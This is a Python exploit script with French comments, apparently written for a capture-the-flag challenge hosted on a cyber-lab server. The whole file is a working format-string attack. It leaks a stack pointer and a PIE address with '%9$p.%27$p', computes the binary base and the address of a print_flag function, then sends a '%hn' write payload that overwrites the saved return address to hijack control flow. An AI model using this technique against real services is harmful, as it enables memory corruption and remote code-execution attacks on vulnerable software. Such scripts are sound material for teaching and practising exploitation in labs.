import sys, socket, time, re, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 28899
PF_OFF = 0x1269

s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(6)
time.sleep(0.6)
try:
    s.recv(4096)
except Exception:
    pass
# leak : position 9 (pointeur de pile) et position 27 (main -> base)
s.sendall(b"%9$p.%27$p\n")
time.sleep(0.6)
data = s.recv(8192).decode("utf-8", "replace")
print("leak:", data[:250])
vals = re.findall(r"0x[0-9a-f]+", data)
if len(vals) < 2:
    print("pas assez de leaks"); sys.exit(1)
stack_leak = int(vals[0], 16)
pie_leak = int(vals[1], 16)
base = pie_leak - 0x1401
pf = base + PF_OFF
print("stack:", hex(stack_leak), "base:", hex(base), "print_flag:", hex(pf))
ret_addr = stack_leak + 0x78
print("ret_addr suppose:", hex(ret_addr))

# verifier que les octets de ret_addr ne contiennent pas de \n ou \x00 premature
targets = [(ret_addr, pf & 0xFFFF), (ret_addr + 4, (pf >> 32) & 0xFFFF), (ret_addr + 2, (pf >> 16) & 0xFFFF)]
targets.sort(key=lambda t: t[1])
spec = ""
prev = 0
for i, (addr, val) in enumerate(targets):
    delta = (val - prev) & 0xFFFF
    if delta:
        spec += f"%{delta}c"
    spec += f"%{11 + i}$hn"
    prev = val
pad = (-len(spec)) % 8
payload = spec.encode() + b"P" * pad
for addr, val in targets:
    payload += struct.pack("<Q", addr)
print("spec len:", len(spec), "payload len:", len(payload))
if len(payload) > 99:
    print("trop long"); sys.exit(1)
s.sendall(payload + b"\n")
time.sleep(1.0)
out = ""
try:
    while True:
        chunk = s.recv(8192)
        if not chunk:
            break
        out += chunk.decode("utf-8", "replace")
except Exception:
    pass
print("=== SORTIE ===")
print(out[-600:])
s.close()
